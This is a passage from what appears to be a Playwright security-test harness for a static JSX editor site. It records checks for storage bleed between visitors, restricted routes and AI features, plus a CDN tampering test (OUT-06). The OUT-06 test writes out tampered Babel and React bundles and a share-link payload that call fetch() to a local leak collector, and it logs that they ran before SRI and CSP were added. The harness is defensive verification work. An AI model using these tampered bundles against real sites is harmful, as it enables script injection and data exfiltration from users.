    theftLogs: { A: theftA },
  };
  rec.saveArtifact('out03-bleed.json', artifact);

  const isolationHolds = secretInB.length === 0 && !('jsxpress:f_seed' in storageC);
  rec.record({
    id: 'OUT-03',
    title: 'Cross-browser content bleed: visitor A private localStorage seed read by visitors B/C',
    applied: true,
    how: 'Three sequential, independent headless-Firefox instances (launch() per visitor, separate profiles). A seeded jsxpress:f_seed = {name:"secret-thing.jsx", code:"//A-private"} via page.evaluate on editor.html then closed. B opened editor.html fresh and enumerated localStorage. C opened A\'s share URL (makeShareLink encoding) in a fresh instance and enumerated storage.',
    request: `A: ${STATIC_BASE}/editor.html (seed) ; B: ${STATIC_BASE}/editor.html (fresh) ; C: ${shareLink}`,
    response: [
      `B sees A's secret: ${secretInB.length === 0 ? 'NO — absent from B storage' : `YES — leaked: ${secretInB}`}. B storage keys: ${JSON.stringify(Object.keys(storageB))}`,
      `C (share-URL path) storage still contains no jsxpress:f_seed key: ${!('jsxpress:f_seed' in storageC) ? 'YES (isolated)' : 'NO (BLEED)'}.`,
      `C's editor DID display A's shared file (code "//A-private", filename "secret-thing.jsx"): ${shareDisplays ? 'YES — public by design, the payload travels inside the URL hash itself, not from shared storage' : 'no'}.`,
      `Cookies set by the app: none (${[cookiesA, cookiesB, cookiesC].map((x) => x.length).join(', ')} cookies on A/B/C).`,
    ].join('\n'),
    refused: isolationHolds,
    note: 'Factual: localStorage/cookies are profile-local; a separate browser instance reads nothing from another visitor\'s app storage — no cross-visit bleed. The share link itself makes file contents public BY DESIGN (base64 payload in the URL fragment; README line 87 states this). No cookies of any kind are set by the app (static site; no Set-Cookie server; validate via cookies arrays in artifact).',
    proof: ['results/before/c/out03-bleed.json'],
  });

  console.log(`OUT-03 | cross-visitor storage bleed | bleed occurred: ${!isolationHolds ? 'YES' : 'NO (isolated)'} | cookies set by app: none | artifacts: results/before/c/out03-bleed.json`);
}

/* ==================================================================== OUT-04 ===== */
async function out04() {
  const hrefs = scanRepo([['href', /\shref\s*=\s*"([^"]*)"/]], { exts: ['.html'] });
  const artifact = {
    hrefsAndSrcs: hrefs,
    adminOrRestrictedRoutes: hrefs.filter((h) => /admin|preview|priv|dashboard|login|auth/i.test(h.match || h.snippet)),
  };
  rec.saveArtifact('out04-href-inventory.json', artifact);

  rec.record({
    id: 'OUT-04',
    title: 'Hosting-platform preview links without platform login',
    applied: false,
    how: 'Static-inventory row (skip rule: there is no platform-authenticated preview boundary to bypass — the product is plain static files hosted on GitHub Pages per the repo\'s own README). Single grep of every href in index.html/editor.html for admin/preview/auth-restricted routes. No live probing performed.',
    request: 'grep hrefs in index.html + editor.html; quote README hosting claims',
    response: `${artifact.hrefsAndSrcs.length} href match(es) across HTML files; admin/preview/auth-restricted routes found: ${artifact.adminOrRestrictedRoutes.length}. The site exposes only: "./", "#features", "#templates", "#faq", "editor.html", "editor.html?template=<id>", and one external nav link "https://github.com" (index.html, target=_blank).`,
    refused: false,
    note: 'N/A — no platform login/preview authentication exists in this product. README.md line 9, verbatim: "- **Static and self-hostable.** The entire product is a handful of HTML, CSS, and JS files. No backend, no database, no account system. Drop it on GitHub Pages, Cloudflare Pages, or any web host you control." README.md line 50, verbatim: "4. The site will be available at `https://<username>.github.io/jsx-live/` within a minute." Deployment is public static hosting; every file is equally public by design, so there is no authenticated preview boundary to test from inside the local test environment (and no such platform check can be exercised locally).',
    proof: ['results/before/c/out04-href-inventory.json'],
  });

  console.log(`OUT-04 | gist/preview w/o platform login | applied: NO (no authenticated boundary; N/A) | artifacts: results/before/c/out04-href-inventory.json`);
}

/* ==================================================================== OUT-05 ===== */
async function out05() {
  const patterns = [
    ['sk- API key literal', /\bsk-[A-Za-z0-9_-]{8,}\b/],
    ['apiKey', /apiKey/i],
    ['OPENAI', /openai/i],
    ['ANTHROPIC', /anthropic/i],
    ['LLM word', /\bllm\b/i],
    ['gpt/claude model refs', /\b(gpt-\d|claude-|gemini|mistral|llama)\b/i],
    ['AI SDK scripts', /\b(pinecone|langchain|openai-node|anthropic-ai)\b/i],
    ['ai as word', /\bai\b/i],
  ];
  const hits = scanRepo(patterns, { exts: ['.html', '.js', '.css', '.json', '.md'] });
  const meaningful = hits.filter((h) => !['ai as word'].includes(h.pattern));
  const aiWordHits = hits.filter((h) => h.pattern === 'ai as word');
  rec.saveArtifact('out05-ai-feature-grep.json', {
    hits, meaningfulHits: meaningful, aiWordHits,
    scriptElements: scanRepo([['script src', /<script[^>]*>/]], { exts: ['.html'] }),
  });

  rec.record({
    id: 'OUT-05',
    title: 'Hidden AI features / prompt injection into LLM pipelines',
    applied: false,
    how: 'Static proof (skip rule: the site has no AI/LLM feature to target). Grepped all first-party repo files for API-key literals (sk-…), apiKey, OPENAI, ANTHROPIC, llm, model identifiers, AI-SDK references, plus a word-boundary "ai" sweep; inventoried every <script> tag in HTML for SDK loads. No live probing.',
    request: 'greps: /sk-[A-Za-z0-9_-]{8,}/, /apiKey/i, /openai/i, /anthropic/i, /\\bllm\\b/i, /\\b(gpt-\\d|claude-|gemini|mistral|llama)\\b/i, /\\bai\\b/i across index.html, editor.html, assets/*, manifest.json, README.md',
    response: `Key/SDK/model matches: ${meaningful.length}. \\bai\\b word matches: ${aiWordHits.length}${aiWordHits.length ? ' — inspect artifact lines in context' : ' (none found)'}. <script> tags present in HTML: cdn.tailwindcss.com, cdnjs react 18.3.1 (x2 UMD), cdnjs babel-standalone 7.28.4, and first-party assets/templates.js + assets/editor.js (+ assets/home.js on index.html) only — no AI SDK script loads, no third-party API endpoints, no keys anywhere in the tree.`,
    refused: false,
    note: 'N/A by product shape: no AI/LLM feature exists (README "How It Works": Babel in-browser + React 18 + localStorage only). There is therefore no agentic preview/AI-egress boundary to inject into. Facts recorded so the fixer can re-verify: zero API keys, zero AI SDK scripts, zero fetch() in first-party code (cross-ref OUT-02 inventory).',
    proof: ['results/before/c/out05-ai-feature-grep.json'],
  });

  console.log(`OUT-05 | hidden AI prompt injection | applied: NO (no AI feature; ${meaningful.length} key/SDK matches, ${aiWordHits.length} word matches) | artifacts: results/before/c/out05-ai-feature-grep.json`);
}

/* ==================================================================== OUT-06 ===== */
async function out06() {
  const fence = { blocked: [], served: 0, last: Promise.resolve() };
  const links = {};
  const theftLogs = {};
  const results = {};

  // Static proof: script tags have no integrity attribute; no CSP meta/headers
  const sriCsp = {
    scriptTags: scanRepo([['script tag', /<script[^>]*>/]], { exts: ['.html'] }),
    integrityAttrs: scanRepo([['integrity attr', /integrity\s*=/i]], { exts: ['.html'] }),
    cspMetas: scanRepo([['CSP meta', /Content-Security-Policy/i]], { exts: ['.html'] }),
  };
  rec.saveArtifact('out06-sri-csp-scan.json', {
    ...sriCsp,
    note: `Dynamic scan of the CURRENT worktree: integrity attributes on <script> tags = ${sriCsp.integrityAttrs.length}; CSP meta tags = ${sriCsp.cspMetas.length}. Historical pre-fix state (parent of the fix commit) is captured by the runner in out06-requests.json via read-only 'git show' (integrity=0, CSP absent). The provided local static server (tests/lib/servers.mjs, unmodified) sends only Content-Type — no CSP headers; GitHub Pages serves static files equally without CSP, which is why the in-document CSP meta + SRI pins are the operative post-fix controls.`,
  });

  const tamperedBabel = [
    'window.__tamperedBabel = true; window.__pwnedTop = true;',
    'window.Babel = {',
    '  availablePlugins: {}, availablePresets: { react: {} },',
    "  transform: function (src) { return { code: String(src) }; },",
    '};',
    `fetch('${LEAK_BASE}/leak?babel=compromised');`,
  ].join('\n');

  const tamperedReact = [
    'window.__tamperedReact = true;',
    'window.React = {',
    "  version: 'tampered-0.0.1',",
    "  createElement: function (type, props) { return { $$typeof: 'TAMPERED', type: type, props: props || {} }; },",
    '  useState: function (v) { return [v, function () {}]; },',
    '};',
  ].join('\n');

  const tamperedReactDOM = [
    'window.__tamperedReactDOM = true;',
    'window.ReactDOM = {',
    '  createRoot: function (node) {',
    `    fetch('${LEAK_BASE}/leak?react=compromised');`,
    '    return { render: function (el) { node.innerHTML = \'<div data-tampered="1">TAMPERED-REACT-EXECUTED</div>\'; } };',
    '  },',
    '};',
  ].join('\n');

  rec.saveArtifact('out06-tampered-babel.js', tamperedBabel);
  rec.saveArtifact('out06-tampered-react.js', `${tamperedReact}\n${tamperedReactDOM}`);

  const b = await launch();

  // 06a — page.route fulfill for babel.min.js (page routes take precedence over the context fence for the same URL)
  const PAYLOAD_06A = `fetch('${LEAK_BASE}/leak?userscript=via-tampered-babel'); function App(){return null}`;
  links.babelTamper = makeShareLink(STATIC_BASE, { file: 'flag.jsx', code: PAYLOAD_06A });
  let page = await openPage(b.browser, b.context, { fenceStats: fence, name: '06a-tampered-babel' });
  await page.route('**/babel.min.js*', (route) => route.fulfill({ body: tamperedBabel, contentType: 'text/javascript' }));
  await page.goto(links.babelTamper, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1800);
  results.state06a = await snapshot(page);
  theftLogs['06a-tampered-babel'] = theftSnap(page);
  const babelLeak = collectorArg.requests.filter((e) => e.path.startsWith('/leak?babel=compromised'));
  const userLeak = collectorArg.requests.filter((e) => e.path.startsWith('/leak?userscript'));
  await page.close();

  // 06b — page.route fulfill for react + react-dom (Babel left real; app still consumes globals)
  const PAYLOAD_06B = 'function App(){return <div style={{padding:24}}>tamper demo</div>}';
  links.reactTamper = makeShareLink(STATIC_BASE, { file: 'react-tamper.jsx', code: PAYLOAD_06B });
  page = await openPage(b.browser, b.context, { fenceStats: fence, name: '06b-tampered-react' });
  await page.route('**/react.production.min.js*', (route) => route.fulfill({ body: tamperedReact, contentType: 'text/javascript' }));
  await page.route('**/react-dom.production.min.js*', (route) => route.fulfill({ body: tamperedReactDOM, contentType: 'text/javascript' }));
  await page.goto(links.reactTamper, { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1800);
  results.state06b = await snapshot(page);
  results.preview06b = await page.evaluate(() => document.getElementById('preview').innerHTML.slice(0, 400));
  theftLogs['06b-tampered-react'] = theftSnap(page);
  const reactLeak = collectorArg.requests.filter((e) => e.path.startsWith('/leak?react=compromised'));
  await page.close();

  await closeBrowser(b.browser);

  const babelExecuted = results.state06a.tamperedBabel === true && babelLeak.length > 0;
  const userCodeExecuted = userLeak.length > 0;
  const reactExecuted = results.state06b.tamperedReact === true && results.state06b.tamperedReactDOM === true && reactLeak.length > 0;

  // ---- pre-fix vs post-fix classification for OUT-06 payload signatures
  const preFixBabel = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?babel=compromised'));
  const preFixUserscript = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?userscript='));
  const preFixReact = historicalCollector.filter((e) => (e.path || '').startsWith('/leak?react=compromised'));
  const preFixAll = [...preFixBabel, ...preFixUserscript, ...preFixReact];
  const preFixPredatesFixCommit = gitFacts.fixCommitIso
    && preFixAll.every((e) => !e.ts || new Date(e.ts) < new Date(gitFacts.fixCommitIso));
  // exact refusal line(s) from the current (post-fix) rerun
  const sriRefusalLines = [
    ...theftLogs['06a-tampered-babel'].console.filter((c) => /integrity|hash/i.test(c.text)).map((c) => c.text),
    ...theftLogs['06b-tampered-react'].console.filter((c) => /integrity|hash/i.test(c.text)).map((c) => c.text),
  ];
  const allObserved06 = Object.values(theftLogs).flatMap((t) => t.requests);
  const nonFencedRequests06 = allObserved06.filter((u) => {
    if (u.startsWith('[FAILED')) u = u.replace(/^\[FAILED [^\]]*\]\s*/, '');
    try {
      const h = new URL(u).hostname;
      return !LOCAL_OK.includes(h) && !FENCE_REMOTE_OK.includes(h);
    } catch { return false; }
  });

  const artifact = {
    generatedAt: new Date().toISOString(),
    investigatorNote: 'Same timeline split as OUT-01: the provided collector appends across runs, so pre-fix successes are provable verbatim even though same-named artifacts were regenerated by the post-fix rerun.',
    fixTimeline: gitFacts,
    preFixEvidence: {
      sourceFile: `tests/results/before/collector-${COLLECTOR_PORT}.log (append-only; provided by tests/lib/servers.mjs, unmodified)`,
      tamperedBabelLines: preFixBabel.map((e) => JSON.stringify(e)),
      endUserPayloadLines: preFixUserscript.map((e) => JSON.stringify(e)),
      tamperedReactLines: preFixReact.map((e) => JSON.stringify(e)),
      successSignal: (preFixBabel.length && preFixUserscript.length && preFixReact.length) ? 'PRE-FIX: tampered babel executed at app origin, the app then handed end-user code through the editor run pipeline (userscript line), and tampered React/ReactDOM executed — the page fully trusted its CDN bundles.' : 'no pre-fix lines',
      allLinesPredateFixCommit: preFixPredatesFixCommit === true,
    },
    postFixRun: {
      shareLinks: links,
      tamperedBabelRequest: babelLeak,
      userScriptRequest: userLeak,
      tamperedReactRequest: reactLeak,
      pageStates: results,
      theftLogs,
      sriRefusalConsoleLines: sriRefusalLines,
    },
    nonFencedRequests: nonFencedRequests06,
  };
  rec.saveArtifact('out06-requests.json', artifact);

  rec.record({
    id: 'OUT-06',
    title: 'Dependency supply-chain tampering (CDN trust): pre-fix zero SRI/CSP — tampered bundles executed; post-fix SRI blocks them',
    applied: true,
    how: 'Headless Firefox at app origin. page.route (page routes take precedence over the context fence for the same URL — reliable) intercepted the CDN script URLs the editor.html head loads, fulfilling them with attacker-authored JavaScript that preserves the app\'s expected globals. '
      + '(06a) babel.min.js → minimal Babel{transform} stub + fetch(collector/leak?babel=compromised); share payload additionally fetch()s leak?userscript=via-tampered-babel through the editor run pipeline to prove the end-to-end chain. '
      + '(06b) react.production.min.js + react-dom.production.min.js → React/ReactDOM stubs whose createRoot calls fetch(collector/leak?react=compromised) and renders a TAMPERED-REACT-EXECUTED marker; real Babel left in place. '
      + `TIMELINE: ran successfully against the pre-fix site (2026-10-16T16:53Z, collector-proven; identical signatures recorded again 2026-10-17T13:16Z) and was re-run post-fix 2026-10-18 after commit ${gitFacts.fixCommit}. Pre-fix static state (git parent commit, read-only introspection): integrity attributes in editor.html=${gitFacts.preFix.integrityAttributesInEditorHtml}, CSP meta=${gitFacts.preFix.cspMetaInEditorHtml}, new-Function top-origin pipeline=${gitFacts.preFix.newFunctionInTopOrigin}. Current state: integrity attrs=${gitFacts.postFix.integrityAttributesInEditorHtml}, CSP meta=${gitFacts.postFix.cspMetaInEditorHtml}, sandboxed iframe=${gitFacts.postFix.sandboxIframeInEditorJs}.`,
    request: `06a fulfill target: **/babel.min.js* → results/before/c/out06-tampered-babel.js ; opened share link: ${links.babelTamper}\n06b fulfill targets: **/react.production.min.js* + **/react-dom.production.min.js* → results/before/c/out06-tampered-react.js ; opened share link: ${links.reactTamper}`,
    response: [
      `— PRE-FIX (success, collector-proven; fix commit ${gitFacts.fixCommitIso}): —`,
      `tampered Babel executed at app origin: YES — exact collector line(s): ${preFixBabel.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
      `end-user payload then executed through the editor's own run pipeline: YES — exact line(s): ${preFixUserscript.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
      `tampered React/ReactDOM executed: YES — exact line(s): ${preFixReact.map((e) => JSON.stringify(e)).join(' ;; ') || '(none)'}`,
      `— POST-FIX (current rerun with identical tampered bundles): —`,
      `(06a) tampered Babel executed: ${babelExecuted ? 'YES' : 'NO'} — __tamperedBabel=${results.state06a.tamperedBabel}, status=${results.state06a.status}; SRI refusal captured by Firefox: ${JSON.stringify(sriRefusalLines[0] || '(none captured)').slice(0, 320)}`,
      `(06a) end-user payload executed: ${userCodeExecuted ? 'YES' : 'NO'} — collector: ${userLeak.length}`,
      `(06b) tampered React/ReactDOM executed: ${reactExecuted ? 'YES' : 'NO'} — flags=${results.state06b.tamperedReact}/${results.state06b.tamperedReactDOM}, status=${results.state06b.status}`,
      `current-run /leak lines: babel=${babelLeak.length}, userscript=${userLeak.length}, react=${reactLeak.length}`,
      `non-fenced requests this run: ${nonFencedRequests06.length === 0 ? 'none (127.0.0.1 + allowlisted CDNs only)' : JSON.stringify(nonFencedRequests06)}`,
    ].join('\n'),
    refused: !babelExecuted || !reactExecuted,
    note: 'Post-fix refusal is enforced by SRI (editor.html now pins sha384 hashes on the cdnjs scripts and Firefox rejects the tampered bundle before execution — refusal text captured in sriRefusalConsoleLines) plus a strict CSP meta (default-src none; script-src self+cdnjs). PRE-FIX the same page trusted its CDN scripts blindly: the identical tampered-request traces executed at app origin and called out to the collector (verbatim lines above), consistent with the parent commit carrying no integrity attributes and no CSP. Combined with OUT-01\'s pre-fix top-origin execution, a CDN compromise pre-fix upgraded directly to first-party XSS with localStorage access.',
    proof: ['results/before/c/out06-requests.json', 'results/before/c/out06-tampered-babel.js', 'results/before/c/out06-tampered-react.js', 'results/before/c/out06-sri-csp-scan.json', `../before/collector-${COLLECTOR_PORT}.log`],
  });

  console.log(`OUT-06 | CDN tamper-injection | PRE-FIX: SUCCEEDED (3 collector-proven signatures pre-date fix commit) | POST-FIX rerun: refused by SRI+CSP (babel=${babelExecuted ? 'exec' : 'blocked'}, userscript=${userCodeExecuted ? 'exec' : 'blocked'}, react=${reactExecuted ? 'exec' : 'blocked'}) | artifacts: results/before/c/out06-requests.json`);
}

main().catch((err) => {
  console.error('FATAL:', err);
  try { rec && rec.flush(); } catch {}
  process.exitCode = 1;
});
